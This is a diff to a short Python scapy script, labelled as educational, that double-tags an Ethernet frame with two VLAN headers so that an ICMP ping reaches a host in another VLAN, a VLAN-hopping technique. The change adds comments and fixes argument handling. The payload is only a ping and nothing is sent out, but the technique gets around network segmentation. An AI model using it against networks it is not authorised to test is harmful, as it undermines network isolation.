@@ -2,25 +2,36 @@
 
 # This tool is for educational use only!
 
-# Sends a ping packet to another vlan
+# Description: Sends a ping packet to a client in another VLAN. Note: Do not
+# expect an answer! The client in the other VLAN don't know that you are in another
+# VLAN and send the answer only to his VLAN
+
+# Requirements: scapy + root privilegues
 
 import sys
 from scapy.all import *
 
 def printusage():
   """ Prints usage information """
-  print "Usage:   {0} <target_MAC> <target_IP> <src_Vlan> <dst_Vlan".format(sys.argv[0])
+  print "Usage:   {0} <target_MAC> <target_IP> <src_Vlan> <dst_Vlan>".format(sys.argv[0])
   print "  ---> This tool is for educational use only! <---"
 
-if len(sys.argv) < 2:
+# Check the arguments
+if len(sys.argv) < 5:
   printusage()
   sys.exit(1)
 
-packet = Ether(dst=sys.argv[1]) / \
-  Dot1Q(vlan=sys.argv[3]) / \
-  Dot1Q(vlan=sys.argv[4]) / \
-  IP(dst=sys.argv[2]) / \
+targetMAC = sys.argv[1]
+targetIP = sys.argv[2]
+targetVLAN = sys.argv[4]
+sourceVLAN = sys.argv[3]
+
+# create the network packet
+packet = Ether(dst=targetMAC) / \
+  Dot1Q(vlan=sourceVLAN) / \
+  Dot1Q(vlan=targetVLAN) / \
+  IP(dst=targetIP) / \
   ICMP()
 
-# ping to other vlan
+# send the ping
 sendp(packet)
